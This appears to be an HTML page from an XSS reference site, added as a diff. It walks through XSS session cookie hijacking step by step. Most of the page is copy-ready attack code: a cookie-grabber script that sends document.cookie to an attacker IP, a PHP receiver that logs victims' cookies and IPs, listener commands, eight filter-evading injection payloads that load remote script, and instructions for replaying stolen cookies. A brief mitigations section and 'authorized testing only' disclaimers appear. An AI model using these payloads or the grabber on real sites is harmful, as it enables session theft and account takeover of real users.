@@ -1,0 +1,715 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>XSS-db | Cookie Hijacking</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;600;700&family=Fira+Code:wght@300;400;500&display=swap" rel="stylesheet">
+<style>
+  :root {
+    --bg: #0a0e0a;
+    --bg2: #0d120d;
+    --bg3: #111811;
+    --surface: #141c14;
+    --surface2: #1a241a;
+    --border: #1f2f1f;
+    --border2: #2a3f2a;
+    --green: #00ff41;
+    --green2: #00cc33;
+    --green3: #008f23;
+    --green4: #004f13;
+    --green-dim: #00ff4133;
+    --green-glow: #00ff4166;
+    --text: #c8ffc8;
+    --text-dim: #6a9a6a;
+    --text-muted: #3a5a3a;
+    --red: #ff4141;
+    --yellow: #ffe041;
+    --cyan: #41ffee;
+    --orange: #ff9944;
+  }
+  * { margin:0; padding:0; box-sizing:border-box; }
+  html { scroll-behavior: smooth; }
+  body {
+    background: var(--bg);
+    color: var(--text);
+    font-family: 'Fira Code', monospace;
+    font-size: 13px;
+    line-height: 1.6;
+    min-height: 100vh;
+    overflow-x: hidden;
+  }
+  body::before {
+    content: '';
+    position: fixed;
+    top:0; left:0; right:0; bottom:0;
+    background: repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,255,65,0.015) 2px,rgba(0,255,65,0.015) 4px);
+    pointer-events: none;
+    z-index: 9999;
+  }
+  nav {
+    position: sticky; top: 0; z-index: 100;
+    background: rgba(10,14,10,0.95);
+    backdrop-filter: blur(10px);
+    border-bottom: 1px solid var(--border2);
+    padding: 0 24px;
+    display: flex; align-items: center; gap: 32px; height: 52px;
+  }
+  .nav-logo { font-family:'Rajdhani',sans-serif; font-weight:700; font-size:20px; color:var(--green); text-shadow:0 0 20px var(--green-glow); letter-spacing:2px; text-decoration:none; flex-shrink:0; }
+  .nav-logo span { color:var(--text-dim); font-weight:400; }
+  .nav-links { display:flex; gap:4px; flex:1; }
+  .nav-links a { color:var(--text-dim); text-decoration:none; padding:6px 14px; border-radius:4px; font-size:12px; letter-spacing:1px; transition:all 0.2s; border:1px solid transparent; font-family:'Share Tech Mono',monospace; }
+  .nav-links a:hover, .nav-links a.active { color:var(--green); border-color:var(--border2); background:var(--surface); text-shadow:0 0 10px var(--green-glow); }
+  .nav-badge { font-size:10px; background:var(--green4); color:var(--green); border:1px solid var(--green3); padding:2px 8px; border-radius:2px; margin-left:auto; font-family:'Share Tech Mono',monospace; letter-spacing:1px; }
+
+  .hero {
+    padding: 60px 24px 40px;
+    border-bottom: 1px solid var(--border);
+    position: relative;
+    overflow: hidden;
+  }
+  .hero::after {
+    content:'';
+    position:absolute; top:-50%; right:-10%; width:600px; height:600px;
+    background:radial-gradient(circle,rgba(255,68,68,0.06) 0%,transparent 70%);
+    pointer-events:none;
+  }
+  .hero-label { font-family:'Share Tech Mono',monospace; font-size:11px; color:var(--green3); letter-spacing:3px; margin-bottom:16px; }
+  .hero h1 { font-family:'Rajdhani',sans-serif; font-size:clamp(28px,4vw,48px); font-weight:700; color:var(--green); text-shadow:0 0 40px var(--green-glow); line-height:1.1; margin-bottom:16px; letter-spacing:2px; }
+  .hero h1 .accent { color: var(--red); text-shadow:0 0 30px rgba(255,65,65,0.5); }
+  .hero p { color:var(--text-dim); max-width:640px; font-size:13px; line-height:1.7; }
+  .warning-box {
+    margin-top: 24px;
+    background: rgba(255,65,65,0.06);
+    border: 1px solid rgba(255,65,65,0.3);
+    border-radius: 6px;
+    padding: 14px 18px;
+    display: flex;
+    gap: 12px;
+    align-items: flex-start;
+    max-width: 640px;
+  }
+  .warn-icon { color: var(--red); flex-shrink: 0; font-size: 16px; }
+  .warn-text { font-size: 12px; color: #cc8888; line-height: 1.6; }
+  .warn-text strong { color: var(--red); }
+
+  .content { padding: 32px 24px; max-width: 900px; }
+
+  .step-section { margin-bottom: 48px; }
+  .step-header {
+    display: flex;
+    align-items: center;
+    gap: 16px;
+    margin-bottom: 20px;
+  }
+  .step-num {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 12px;
+    font-weight: 700;
+    letter-spacing: 3px;
+    color: var(--green3);
+    background: var(--green4);
+    border: 1px solid var(--green3);
+    padding: 4px 12px;
+    border-radius: 3px;
+    flex-shrink: 0;
+  }
+  .step-title {
+    font-family: 'Rajdhani', sans-serif;
+    font-size: 22px;
+    font-weight: 700;
+    color: var(--green);
+    letter-spacing: 1px;
+  }
+  .step-desc {
+    color: var(--text-dim);
+    font-size: 12px;
+    line-height: 1.7;
+    margin-bottom: 16px;
+    max-width: 700px;
+  }
+
+  .code-block {
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    overflow: hidden;
+    margin-bottom: 16px;
+  }
+  .code-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 8px 14px;
+    background: var(--surface);
+    border-bottom: 1px solid var(--border);
+  }
+  .code-lang {
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 10px;
+    color: var(--text-muted);
+    letter-spacing: 2px;
+  }
+  .code-filename {
+    font-family: 'Fira Code', monospace;
+    font-size: 11px;
+    color: var(--green3);
+  }
+  .copy-btn {
+    background: none;
+    border: 1px solid var(--border2);
+    color: var(--text-muted);
+    padding: 3px 10px;
+    cursor: pointer;
+    font-size: 10px;
+    font-family: 'Share Tech Mono', monospace;
+    border-radius: 2px;
+    transition: all 0.2s;
+  }
+  .copy-btn:hover { color: var(--green); border-color: var(--green3); }
+  .copy-btn.copied { color: var(--green); border-color: var(--green3); text-shadow: 0 0 8px var(--green-glow); }
+  pre {
+    padding: 20px;
+    overflow-x: auto;
+    font-family: 'Fira Code', monospace;
+    font-size: 12px;
+    line-height: 1.7;
+  }
+
+  /* Syntax colors */
+  .kw { color: #ff9944; }
+  .str { color: #ffe041; }
+  .fn { color: #41ffee; }
+  .cmt { color: var(--text-muted); font-style: italic; }
+  .var { color: #00ff41; }
+  .tag { color: #ff6688; }
+  .php { color: #9944ff; }
+  .num { color: #ff4488; }
+  .sh { color: #c8ffc8; }
+  .sh-prompt { color: var(--green3); }
+  .sh-cmd { color: #ffe041; }
+  .hl { color: var(--green); }
+
+  .info-grid {
+    display: grid;
+    grid-template-columns: repeat(auto-fit, minmax(220px, 1fr));
+    gap: 12px;
+    margin-bottom: 20px;
+  }
+  .info-card {
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 16px;
+  }
+  .info-card-label { font-size: 10px; color: var(--text-muted); letter-spacing: 2px; margin-bottom: 6px; }
+  .info-card-value { font-size: 13px; color: var(--text); font-family: 'Fira Code', monospace; }
+  .info-card-value .highlight { color: var(--green); }
+
+  .flow-diagram {
+    background: var(--surface);
+    border: 1px solid var(--border2);
+    border-radius: 6px;
+    padding: 24px;
+    margin-bottom: 24px;
+    font-family: 'Share Tech Mono', monospace;
+    font-size: 11px;
+    overflow-x: auto;
+  }
+  .flow-row {
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    margin-bottom: 8px;
+    flex-wrap: wrap;
+  }
+  .flow-box {
+    background: var(--bg3);
+    border: 1px solid var(--border2);
+    padding: 6px 14px;
+    border-radius: 3px;
+    color: var(--text-dim);
+    white-space: nowrap;
+  }
+  .flow-box.green { border-color: var(--green3); color: var(--green); }
+  .flow-box.red { border-color: rgba(255,65,65,0.4); color: #ff8888; }
+  .flow-box.yellow { border-color: rgba(255,224,65,0.4); color: var(--yellow); }
+  .flow-arrow { color: var(--text-muted); }
+
+  .payload-variants {
+    display: grid;
+    gap: 8px;
+  }
+  .variant-item {
+    background: var(--surface);
+    border: 1px solid var(--border);
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  .variant-header {
+    display: flex;
+    align-items: center;
+    padding: 8px 12px;
+    gap: 10px;
+    cursor: pointer;
+  }
+  .variant-idx { font-size: 10px; color: var(--text-muted); width: 24px; flex-shrink: 0; }
+  .variant-code { font-family: 'Fira Code', monospace; font-size: 12px; color: var(--green2); flex: 1; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+  .variant-tag { font-size: 9px; padding: 2px 8px; background: rgba(0,255,65,0.08); border: 1px solid var(--green4); color: var(--green3); border-radius: 2px; font-family: 'Share Tech Mono', monospace; }
+  .variant-copy { background: none; border: 1px solid var(--border2); color: var(--text-muted); padding: 3px 10px; cursor: pointer; font-size: 10px; font-family: 'Share Tech Mono', monospace; border-radius: 2px; transition: all 0.2s; flex-shrink: 0; }
+  .variant-copy:hover { color: var(--green); border-color: var(--green3); }
+  .variant-detail { display: none; padding: 12px 16px; border-top: 1px solid var(--border); background: var(--bg); }
+  .variant-detail.open { display: block; }
+  .variant-full { background: var(--bg3); border: 1px solid var(--border2); border-radius: 4px; padding: 10px; font-family: 'Fira Code', monospace; font-size: 12px; color: var(--green); word-break: break-all; margin-bottom: 8px; }
+  .variant-desc { color: var(--text-dim); font-size: 12px; line-height: 1.6; }
+
+  .divider { height: 1px; background: var(--border); margin: 48px 0; }
+
+  footer { border-top:1px solid var(--border); padding:24px; text-align:center; color:var(--text-muted); font-size:11px; letter-spacing:1px; }
+  footer a { color:var(--green3); text-decoration:none; }
+
+  .toast { position:fixed; bottom:24px; right:24px; background:var(--surface2); border:1px solid var(--green3); color:var(--green); padding:10px 20px; border-radius:4px; font-family:'Share Tech Mono',monospace; font-size:12px; letter-spacing:1px; opacity:0; transform:translateY(10px); transition:all 0.3s; z-index:9998; text-shadow:0 0 10px var(--green-glow); box-shadow:0 0 20px var(--green-dim); }
+  .toast.show { opacity:1; transform:translateY(0); }
+
+  @media(max-width:768px) { nav { gap:16px; } .nav-links a { padding:6px 10px; font-size:11px; } }
+</style>
+</head>
+<body>
+
+<nav>
+  <a class="nav-logo" href="index.html">XSS<span>-db</span></a>
+  <div class="nav-links">
+    <a href="index.html">WORDLIST</a>
+    <a href="hijacking.html" class="active">XSS HIJACKING</a>
+    <a href="phishing.html">XSS PHISHING</a>
+  </div>
+  <div class="nav-badge">v1.0.0</div>
+</nav>
+
+<div class="hero">
+  <div class="hero-label">&gt; MODULE / XSS HIJACKING</div>
+  <h1>Session Cookie <span class="accent">Hijacking</span></h1>
+  <p>XSS session hijacking is an attack that uses a Cross-Site Scripting vulnerability to steal a victim's session cookie. Once the attacker captures the cookie, they can impersonate the victim by replaying it in authenticated requests — effectively taking over their session without needing credentials.</p>
+  <div class="warning-box">
+    <div class="warn-icon">⚠</div>
+    <div class="warn-text"><strong>AUTHORIZED TESTING ONLY.</strong> Performing cookie hijacking against systems you do not own or have explicit written permission to test is illegal under computer fraud laws. This documentation is for educational and CTF use only.</div>
+  </div>
+</div>
+
+<div class="content">
+
+  <!-- HOW IT WORKS -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">OVERVIEW</div>
+      <div class="step-title">How It Works</div>
+    </div>
+    <div class="step-desc">
+      The attack flows in three phases: inject a remote script via XSS → the victim's browser executes the script and sends their cookie to your server → your PHP listener captures and logs the cookie. You then replay the cookie in your browser to hijack the session.
+    </div>
+
+    <div class="flow-diagram">
+      <div class="flow-row">
+        <div class="flow-box">Attacker injects XSS</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box green">Victim visits page</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box yellow">Browser loads script.js</div>
+      </div>
+      <div class="flow-row">
+        <div class="flow-box yellow">script.js sends cookie via GET</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box red">index.php logs cookie</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box green">Attacker reads cookies.txt</div>
+      </div>
+      <div class="flow-row">
+        <div class="flow-box green">Attacker replays cookie</div>
+        <div class="flow-arrow">→</div>
+        <div class="flow-box red">SESSION HIJACKED</div>
+      </div>
+    </div>
+
+    <div class="info-grid">
+      <div class="info-card">
+        <div class="info-card-label">ATTACKER IP</div>
+        <div class="info-card-value"><span class="highlight">10.200.1.255</span> (replace with yours)</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">LISTENER PORT</div>
+        <div class="info-card-value"><span class="highlight">80</span> (HTTP)</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">SERVER SOFTWARE</div>
+        <div class="info-card-value"><span class="highlight">PHP 7.4+</span> built-in server</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">LOG FILE</div>
+        <div class="info-card-value"><span class="highlight">cookies.txt</span></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 1: script.js -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 01</div>
+      <div class="step-title">Setup script.js — The Cookie Grabber</div>
+    </div>
+    <div class="step-desc">
+      This JavaScript file runs on the <strong>victim's browser</strong> when they trigger the XSS. It creates a new Image object with a specially crafted src URL that appends document.cookie as a query parameter. The victim's browser makes a GET request to your server, and the cookie travels in the URL.
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JAVASCRIPT</span>
+        <span class="code-filename">script.js</span>
+        <button class="copy-btn" onclick="copyCode(this, 'script-js')">COPY</button>
+      </div>
+      <pre id="script-js"><span class="kw">new</span> <span class="fn">Image</span>().src = <span class="str">'http://10.200.1.255/index.php?c='</span> + <span class="var">document</span>.cookie</pre>
+    </div>
+
+    <div class="step-desc">
+      <strong style="color:var(--text)">How it works:</strong> The Image object's src is set to your server URL with document.cookie appended. The browser immediately attempts to load the image — which triggers an HTTP GET to your server with the cookie in the query string. The server never needs to actually serve an image; it just needs to log the request.
+    </div>
+
+    <div class="step-desc" style="margin-top:12px">
+      <strong style="color:var(--yellow)">Enhanced version</strong> — encodes cookie and includes referrer for context:
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JAVASCRIPT</span>
+        <span class="code-filename">script.js (enhanced)</span>
+        <button class="copy-btn" onclick="copyCode(this, 'script-js-enhanced')">COPY</button>
+      </div>
+      <pre id="script-js-enhanced"><span class="kw">var</span> <span class="var">img</span> = <span class="kw">new</span> <span class="fn">Image</span>();
+<span class="var">img</span>.src = <span class="str">'http://10.200.1.255/index.php?c='</span>
+  + <span class="fn">encodeURIComponent</span>(<span class="var">document</span>.cookie)
+  + <span class="str">'&url='</span> + <span class="fn">encodeURIComponent</span>(<span class="var">document</span>.location.href)
+  + <span class="str">'&ua='</span> + <span class="fn">encodeURIComponent</span>(<span class="var">navigator</span>.userAgent);</pre>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 2: index.php -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 02</div>
+      <div class="step-title">Setup index.php — The Cookie Receiver</div>
+    </div>
+    <div class="step-desc">
+      This PHP script runs on <strong>your server</strong>. It listens for GET requests containing the cookie parameter, parses the cookie string, and writes each cookie along with the victim's IP address to a log file called cookies.txt.
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">PHP</span>
+        <span class="code-filename">index.php</span>
+        <button class="copy-btn" onclick="copyCode(this, 'index-php')">COPY</button>
+      </div>
+      <pre id="index-php"><span class="php">&lt;?php</span>
+<span class="kw">if</span> (<span class="fn">isset</span>(<span class="var">$_GET</span>[<span class="str">'c'</span>])) {
+    <span class="var">$list</span> = <span class="fn">explode</span>(<span class="str">";"</span>, <span class="var">$_GET</span>[<span class="str">'c'</span>]);
+    <span class="kw">foreach</span> (<span class="var">$list</span> <span class="kw">as</span> <span class="var">$key</span> =&gt; <span class="var">$value</span>) {
+        <span class="var">$cookie</span> = <span class="fn">urldecode</span>(<span class="var">$value</span>);
+        <span class="var">$file</span>   = <span class="fn">fopen</span>(<span class="str">"cookies.txt"</span>, <span class="str">"a+"</span>);
+        <span class="fn">fputs</span>(<span class="var">$file</span>, <span class="str">"Victim IP: {<span class="var">$_SERVER</span>[<span class="str">'REMOTE_ADDR'</span>]} | Cookie: {<span class="var">$cookie</span>}\n"</span>);
+        <span class="fn">fclose</span>(<span class="var">$file</span>);
+    }
+}
+<span class="php">?&gt;</span></pre>
+    </div>
+
+    <div class="step-desc">
+      <strong style="color:var(--text)">Code breakdown:</strong> The script checks if the 'c' GET parameter exists, explodes the cookie string on semicolons (cookies are semicolon-delimited), URL-decodes each value (since document.cookie may be URL-encoded), then appends each cookie with the victim's IP to cookies.txt using append mode "a+".
+    </div>
+
+    <div class="step-desc" style="margin-top:12px">
+      <strong style="color:var(--yellow)">Enhanced version</strong> — adds timestamp, URL, and User-Agent logging:
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">PHP</span>
+        <span class="code-filename">index.php (enhanced)</span>
+        <button class="copy-btn" onclick="copyCode(this, 'index-php-enhanced')">COPY</button>
+      </div>
+      <pre id="index-php-enhanced"><span class="php">&lt;?php</span>
+<span class="kw">if</span> (<span class="fn">isset</span>(<span class="var">$_GET</span>[<span class="str">'c'</span>])) {
+    <span class="var">$ip</span>        = <span class="var">$_SERVER</span>[<span class="str">'REMOTE_ADDR'</span>];
+    <span class="var">$time</span>      = <span class="fn">date</span>(<span class="str">'Y-m-d H:i:s'</span>);
+    <span class="var">$url</span>       = <span class="fn">isset</span>(<span class="var">$_GET</span>[<span class="str">'url'</span>]) ? <span class="fn">urldecode</span>(<span class="var">$_GET</span>[<span class="str">'url'</span>]) : <span class="str">'unknown'</span>;
+    <span class="var">$ua</span>        = <span class="fn">isset</span>(<span class="var">$_GET</span>[<span class="str">'ua'</span>])  ? <span class="fn">urldecode</span>(<span class="var">$_GET</span>[<span class="str">'ua'</span>])  : <span class="str">'unknown'</span>;
+    <span class="var">$list</span>      = <span class="fn">explode</span>(<span class="str">";"</span>, <span class="fn">urldecode</span>(<span class="var">$_GET</span>[<span class="str">'c'</span>]));
+
+    <span class="var">$file</span> = <span class="fn">fopen</span>(<span class="str">"cookies.txt"</span>, <span class="str">"a+"</span>);
+    <span class="fn">fputs</span>(<span class="var">$file</span>, <span class="str">"[{<span class="var">$time</span>}] IP: {<span class="var">$ip</span>} | URL: {<span class="var">$url</span>}\n"</span>);
+    <span class="fn">fputs</span>(<span class="var">$file</span>, <span class="str">"UA: {<span class="var">$ua</span>}\n"</span>);
+    <span class="kw">foreach</span> (<span class="var">$list</span> <span class="kw">as</span> <span class="var">$cookie</span>) {
+        <span class="fn">fputs</span>(<span class="var">$file</span>, <span class="str">"  Cookie: {<span class="var">$cookie</span>}\n"</span>);
+    }
+    <span class="fn">fputs</span>(<span class="var">$file</span>, <span class="str">"---\n"</span>);
+    <span class="fn">fclose</span>(<span class="var">$file</span>);
+}
+<span class="php">?&gt;</span></pre>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 3: PHP server -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 03</div>
+      <div class="step-title">Start the PHP Listener</div>
+    </div>
+    <div class="step-desc">
+      Run PHP's built-in development server on port 80. Place both script.js and index.php in the same directory before starting the server. The server will serve script.js to the victim and receive cookie data at index.php.
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SHELL</span>
+        <span class="code-filename">terminal</span>
+        <button class="copy-btn" onclick="copyCode(this, 'php-listener')">COPY</button>
+      </div>
+      <pre id="php-listener"><span class="sh-prompt">$</span> <span class="sh-cmd">mkdir /tmp/tmpserver && cd /tmp/tmpserver</span>
+<span class="cmt"># Place script.js and index.php here</span>
+<span class="sh-prompt">$</span> <span class="sh-cmd">sudo php -S 0.0.0.0:80</span>
+<span class="cmt">PHP 7.4.15 Development Server (http://0.0.0.0:80) started</span></pre>
+    </div>
+
+    <div class="step-desc">
+      <strong style="color:var(--yellow)">Monitor live requests</strong> — tail the cookies file in a second terminal:
+    </div>
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SHELL</span>
+        <span class="code-filename">terminal (second window)</span>
+        <button class="copy-btn" onclick="copyCode(this, 'monitor')">COPY</button>
+      </div>
+      <pre id="monitor"><span class="sh-prompt">$</span> <span class="sh-cmd">tail -f /tmp/tmpserver/cookies.txt</span>
+<span class="cmt">Victim IP: 192.168.1.50 | Cookie: PHPSESSID=abc123def456; user_token=xyz789</span></pre>
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 4: Inject payloads -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 04</div>
+      <div class="step-title">Inject the XSS Payload</div>
+    </div>
+    <div class="step-desc">
+      Inject one of the following payloads into the target's input field, comment box, URL parameter, or any reflected/stored XSS vector. Each payload loads script.js from your server, which the victim's browser will execute.
+    </div>
+
+    <div class="payload-variants" id="injection-payloads"></div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- STEP 5: Use the cookie -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">STEP 05</div>
+      <div class="step-title">Use the Stolen Cookie</div>
+    </div>
+    <div class="step-desc">
+      Once you receive the session cookie in cookies.txt, you can use it to impersonate the victim. Set the cookie in your browser's developer tools or use a tool like curl or Burp Suite to replay authenticated requests.
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">SHELL</span>
+        <span class="code-filename">curl with stolen cookie</span>
+        <button class="copy-btn" onclick="copyCode(this, 'curl-cookie')">COPY</button>
+      </div>
+      <pre id="curl-cookie"><span class="sh-prompt">$</span> <span class="sh-cmd">curl -b "PHPSESSID=abc123def456" https://target.com/dashboard</span></pre>
+    </div>
+
+    <div class="code-block">
+      <div class="code-header">
+        <span class="code-lang">JAVASCRIPT (DevTools Console)</span>
+        <span class="code-filename">Set cookie in browser</span>
+        <button class="copy-btn" onclick="copyCode(this, 'devtools-cookie')">COPY</button>
+      </div>
+      <pre id="devtools-cookie"><span class="cmt">// Open DevTools (F12) → Console → paste and run:</span>
+<span class="var">document</span>.cookie = <span class="str">"PHPSESSID=abc123def456; path=/"</span>;</pre>
+    </div>
+
+    <div class="step-desc">
+      <strong style="color:var(--yellow)">Browser extension method:</strong> Install EditThisCookie or Cookie-Editor, navigate to the target domain, and manually paste the stolen session cookie. Refresh the page — you should now be authenticated as the victim.
+    </div>
+  </div>
+
+  <div class="divider"></div>
+
+  <!-- DEFENSES -->
+  <div class="step-section">
+    <div class="step-header">
+      <div class="step-num">DEFENSE</div>
+      <div class="step-title">Mitigations & Protections</div>
+    </div>
+    <div class="info-grid">
+      <div class="info-card">
+        <div class="info-card-label">HttpOnly FLAG</div>
+        <div class="info-card-value">Set-Cookie: session=...; <span class="highlight">HttpOnly</span> — prevents document.cookie from reading the cookie in JS.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">CSP HEADER</div>
+        <div class="info-card-value">Content-Security-Policy: <span class="highlight">script-src 'self'</span> — blocks loading scripts from attacker domains.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">SAMESITE FLAG</div>
+        <div class="info-card-value">Set-Cookie: session=...; <span class="highlight">SameSite=Strict</span> — limits cross-site cookie sending.</div>
+      </div>
+      <div class="info-card">
+        <div class="info-card-label">INPUT SANITIZATION</div>
+        <div class="info-card-value"><span class="highlight">Escape & validate</span> all user input. Never reflect raw user data into HTML without encoding.</div>
+      </div>
+    </div>
+  </div>
+
+</div>
+
+<footer>
+  <div style="color:var(--green3); font-family:'Rajdhani',sans-serif; font-size:16px; font-weight:700; margin-bottom:8px; letter-spacing:3px;">XSS-db</div>
+  FOR EDUCATIONAL AND AUTHORIZED SECURITY TESTING PURPOSES ONLY &nbsp;|&nbsp;
+  <a href="index.html">← BACK TO WORDLIST</a>
+</footer>
+
+<div class="toast" id="toast">COPIED TO CLIPBOARD</div>
+
+<script>
+const INJECTION_PAYLOADS = [
+  {
+    code: `<script src=http://10.200.1.255/><\/script>`,
+    tag: 'BASIC',
+    desc: 'Simplest script src injection. Works in raw HTML context where script tags are reflected as-is. The browser fetches and executes script.js from your server.'
+  },
+  {
+    code: `'><script src=http://10.200.1.255><\/script>`,
+    tag: 'ATTR BREAK',
+    desc: "Breaks out of a single-quoted HTML attribute with '>, then injects the script tag. Use when input is reflected inside an attribute value like value='...'"
+  },
+  {
+    code: `"><script src=http://10.200.1.255><\/script>`,
+    tag: 'ATTR BREAK',
+    desc: 'Breaks out of a double-quoted HTML attribute with ">, then injects. Most common attribute escape pattern for double-quote contexts.'
+  },
+  {
+    code: `javascript:eval('var a=document.createElement(\'script\');a.src=\'http://10.200.1.255\';document.body.appendChild(a)')`,
+    tag: 'JAVASCRIPT URI',
+    desc: 'JavaScript: URI that dynamically creates and appends a script element. Works in href, src, action, and other URL attributes. Avoids the <script> tag entirely.'
+  },
+  {
+    code: `<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//10.200.1.255");a.send();<\/script>`,
+    tag: 'XHR BASED',
+    desc: 'Uses XMLHttpRequest to fetch script.js content, then evals the response. Bypasses filters that block script src= attributes. The response text is executed directly.'
+  },
+  {
+    code: `<script>$.getScript("http://10.200.1.255")<\/script>`,
+    tag: 'JQUERY',
+    desc: "jQuery's $.getScript() loads and executes remote JavaScript. Requires jQuery to be loaded on the target page. Common in older web applications."
+  },
+  {
+    code: `<img src=x onerror="var s=document.createElement('script');s.src='http://10.200.1.255/';document.head.appendChild(s)">`,
+    tag: 'ALTERNATIVE',
+    desc: 'img onerror creates a script element programmatically. Works when script tags are filtered but img tags are not. More evasive than direct script injection.'
+  },
+  {
+    code: `<svg onload="var s=document.createElement('script');s.src='//10.200.1.255/';document.body.appendChild(s)">`,
+    tag: 'SVG',
+    desc: 'SVG onload variant. SVG elements are often overlooked by filters. Creates the same dynamic script loader but wrapped in an SVG context.'
+  }
+];
+
+function renderVariants() {
+  const container = document.getElementById('injection-payloads');
+  INJECTION_PAYLOADS.forEach(function(p, i) {
+    const item = document.createElement('div');
+    item.className = 'variant-item';
+
+    const header = document.createElement('div');
+    header.className = 'variant-header';
+    header.onclick = function(){ this.nextElementSibling.classList.toggle('open'); };
+
+    const idxEl = document.createElement('div');
+    idxEl.className = 'variant-idx';
+    idxEl.textContent = i + 1;
+
+    const codeEl = document.createElement('div');
+    codeEl.className = 'variant-code';
+    codeEl.textContent = p.code;
+
+    const tagEl = document.createElement('div');
+    tagEl.className = 'variant-tag';
+    tagEl.textContent = p.tag;
+
+    const copyBtn = document.createElement('button');
+    copyBtn.className = 'variant-copy';
+    copyBtn.textContent = 'COPY';
+    copyBtn.onclick = function(e){ e.stopPropagation(); cpCode(this, encodeURIComponent(p.code)); };
+
+    header.appendChild(idxEl);
+    header.appendChild(codeEl);
+    header.appendChild(tagEl);
+    header.appendChild(copyBtn);
+
+    const detail = document.createElement('div');
+    detail.className = 'variant-detail';
+
+    const fullEl = document.createElement('div');
+    fullEl.className = 'variant-full';
+    fullEl.textContent = p.code;
+
+    const descEl = document.createElement('div');
+    descEl.className = 'variant-desc';
+    descEl.textContent = p.desc;
+
+    detail.appendChild(fullEl);
+    detail.appendChild(descEl);
+    item.appendChild(header);
+    item.appendChild(detail);
+    container.appendChild(item);
+  });
+}
+
+function escHtml(s) {
+  return s.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;').replace(/`/g,'&#96;').replace(/\$/g,'&#36;');
+}
+
+function cpCode(btn, encoded) {
+  navigator.clipboard.writeText(decodeURIComponent(encoded)).then(() => {
+    btn.textContent = 'COPIED!';
+    setTimeout(() => btn.textContent = 'COPY', 1500);
+    showToast();
+  });
+}
+
+function copyCode(btn, id) {
+  const el = document.getElementById(id);
+  const text = el.innerText || el.textContent;
+  navigator.clipboard.writeText(text).then(() => {
+    btn.textContent = 'COPIED!';
+    btn.classList.add('copied');
+    setTimeout(() => { btn.textContent = 'COPY'; btn.classList.remove('copied'); }, 1500);
+    showToast();
+  });
+}
+
+function showToast() {
+  const t = document.getElementById('toast');
+  t.classList.add('show');
+  setTimeout(() => t.classList.remove('show'), 2000);
+}
+
+renderVariants();
+</script>
+</body>
+</html>
